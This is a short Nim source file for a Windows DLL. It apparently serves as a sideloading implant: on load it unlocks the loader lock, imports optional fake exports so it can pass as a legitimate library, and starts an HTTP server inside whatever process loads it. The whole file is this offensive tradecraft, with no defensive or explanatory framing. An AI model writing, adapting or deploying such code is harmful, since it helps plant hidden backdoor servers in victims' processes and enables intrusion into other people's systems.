import winim
import httpserv
when defined(fakeexports):
  import fakeexports
when defined(unlockloader):
  import lockpick


proc NimMain() {.cdecl, importc.}

proc DllMain(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall, exportc, dynlib.} =
  if fdwReason != DLL_PROCESS_ATTACH: return true

  NimMain()

  when defined(unlockloader):
    unlockLoaderLock()
    var hThread = CreateThread(
      cast[LPSECURITY_ATTRIBUTES](NULL), 
      0.SIZE_T, 
      cast[LPTHREAD_START_ROUTINE](runHttpServ), 
      cast[LPVOID](NULL), 
      0.DWORD, 
      cast[LPDWORD](NULL)
    )
    WaitForSingleObject(hThread, 20000.DWORD)
    lockLoaderLock()
  else:
    runHttpServ()

  return true
